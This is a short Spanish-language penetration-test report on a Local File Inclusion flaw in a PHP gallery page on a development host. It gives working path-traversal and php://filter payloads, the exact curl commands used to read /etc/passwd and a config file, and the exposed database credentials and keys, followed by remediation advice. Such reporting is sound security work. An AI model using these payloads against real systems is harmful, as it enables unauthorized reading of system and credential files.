# Informe LFI

Objetivo: http://web.dev.local:8081

Vulnerabilidad: Local File Inclusion (LFI) en gallery.php?page

Pruebas realizadas:
- Acceso directo: gallery.php?page=../../../../../../etc/passwd -> éxito, se leyó /etc/passwd
- php://filter: gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../var/www/html/config.php -> éxito, archivo config.php base64 decodificado
- Intento de /proc/self/environ -> generó advertencia con ruta y línea en gallery.php

Archivos obtenidos:
- /etc/passwd (listado de usuarios)
- /var/www/html/config.php (credenciales de base de datos y claves):

```
<?php
// Secret configuration file
// Database credentials (example)

define('DB_HOST', 'localhost');
define('DB_USER', 'gallery_user');
define('DB_PASS', 'SuperSecret123!');
define('DB_NAME', 'gallery_db');

define('SECRET_KEY', 'th1s_is_a_v3ry_s3cr3t_k3y_2025');
define('API_TOKEN', 'api_token_abc123xyz789');

// This file can be exposed through LFI vulnerability
// Example: gallery.php?page=../config
?>

```

Comandos exactos usados:
- curl -sS -D - -L --max-time 10 http://web.dev.local:8081/
- curl -sS --max-time 10 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
- curl -sS --max-time 10 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../var/www/html/config.php'
- curl -sS --max-time 10 'http://web.dev.local:8081/gallery.php?page=../../../../../../proc/self/environ'

Impacto:
- Divulgación de información sensible (credenciales DB, claves).
- Vía para escalada: lectura de /etc/passwd y potencialmente /etc/shadow si permisos lo permiten.

Recomendaciones:
- Validar y sanitizar parámetros antes de usar include().
- Reemplazar include con whitelist de páginas permitidas o usar routing seguro.
- Evitar exponer errores de PHP en producción (display_errors = Off).

Fecha y hora UTC: 2026-04-18T08:17:33.722601
